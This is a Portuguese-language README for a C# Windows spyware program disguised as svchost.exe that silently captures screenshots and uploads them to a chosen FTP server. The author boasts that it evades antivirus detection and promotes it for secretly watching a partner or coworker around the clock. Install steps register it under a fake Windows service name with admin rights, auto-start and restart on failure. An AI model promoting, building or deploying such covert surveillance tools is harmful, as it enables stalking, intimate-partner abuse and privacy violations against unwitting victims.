svchost ? WTF
===
__"N�o perca seu tempo instalando antivirus. Eles s�o o piores virus que existem e s� deixam sua m�quina lenta. Quer se proteger de verdade? Entenda como funcionam os virus!"__

Tenho feito essa afirma��o nos �ltimos 4 anos da minha vida de garoto de programa. As vezes alguns me perguntam qual o melhor antivirus e eu digo nenhum. Uns n�o entendem, outros come�am a discutir e outros acham que eu estou falando abrobrinha. Tolos. Para provar criei esse programa em 2006, em C# e dotnet 1.1, que ao instalado na m�quina fica tirando screenshots da m�quina em que est� instalado e enviando para um ftp de sua escolha em um tempo pr� determinado. J� passou no teste de dezenas de anti-virus e � praticamente indetect�vel. Funciona que � uma beleza, na rede local :)

__[modo polishop on]
E n�o � s� isso!
Se voc� tem d�vida que seu companheiro de relacionamento est� te sacaneando ou quer s� espionar aquele membro da equipe folgado, que vc sabe que n�o est� fazendo nada, s� matando tempo e na sua frente faz se parecer a pessoa mais esfor�ada e estudiosa do planeta, esse programa � para voc�. Agora voc� pode espiona-lo 24 horas por dia sem nenhum esfor�o na tranqualidade do seu pc.
__[/modo polishop off] 

E antes de pensar em us�-lo, para n�o vir me chingar depois, lembre-se:
"A ignor�ncia � uma ben��o" (http://www.interney.net/blogs/inagaki/2008/03/04/o_poder_da_ignorancia/)
======

Instala��o
===
1. Clone ou fa�a o download do projeto do github.
2. Entre no diret�rio bin\Release e configure o arquivo svchost.exe.config com o nome de usu�rio e senha do ftp, ip, e o intervalo em milisegundos que vc quer os screenshots.
3. Execute o instala.bat
4. Encontre o servi�o "Assistente de detec��o do hardware do shell". Sim eu sei. Tem 2, se voc� estiver usando o rWindows em portugu�s. Escolha o correto :). Se n�o souber qual o correto, morra lentamente!
5. Configure um login de administrador no servi�o, e d� permiss�o para que o servi�o possa interagir com o desktop.
6. Configure o servi�o para que ele possa iniciar automaticamente, e reiniciar em caso de falha.
7. Descubra se voc� tinha raz�o! E solte aquele cl�ssico "Eu sabia ...". N�o, vc n�o sabia! LOL

N�o use para o MAL :|
luisbebop@gmail.com